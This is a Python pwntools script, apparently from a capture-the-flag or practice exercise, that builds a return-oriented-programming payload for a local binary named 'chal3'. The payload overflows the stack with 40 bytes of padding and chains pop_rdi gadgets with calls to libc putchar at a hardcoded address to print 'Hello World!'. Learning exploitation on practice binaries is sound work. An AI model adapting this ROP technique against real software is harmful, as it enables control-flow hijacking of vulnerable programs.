# Credit to Crypto-Cat on Github for this template

from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify GDB script here (breakpoints etc)
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())


# Binary filename
exe = './chal3'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

#io = start()

libc_base = 0x00007ffff7dd0000
putchar = libc_base + 0x73e70 # libc function we are calling 10 times
pop_rdi = 0x4011eb # used to place chars in parameters

main = 0x0401142

# character definitions
H = 0x48
e = 0x65
l = 0x6c
l = 0x6c
o = 0x6f
space = 0x20
W = 0x57
o = 0x6f
r = 0x72
l = 0x6c
d = 0x64
ex_mark = 0x21


# How many bytes to the instruction pointer (RIP)?
padding = 40

payload = flat(
    asm('nop') * padding,  # Padding up to RIP

    
    pop_rdi,  # Pop the following address into the RDI register
    H,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    e,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    l,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    l,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    o,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    space,  # Char I want to print
    putchar,  # Print the Char

    pop_rdi,  # Pop the following address into the RDI register
    W,  # Char I want to print
    putchar,  # Print the Char

    pop_rdi,  # Pop the following address into the RDI register
    o,  # Char I want to print
    putchar,  # Print the Char
    
    pop_rdi,  # Pop the following address into the RDI register
    r,  # Char I want to print
    putchar,  # Print the Char

    pop_rdi,  # Pop the following address into the RDI register
    l,  # Char I want to print
    putchar,  # Print the Char

    pop_rdi,  # Pop the following address into the RDI register
    d,  # Char I want to print
    putchar,  # Print the Char

    pop_rdi,  # Pop the following address into the RDI register
    ex_mark,  # Char I want to print
    putchar,  # Print the Char

    main, #stop the segfault from not displaying our data
)

# Write payload to file
write('payload', payload)


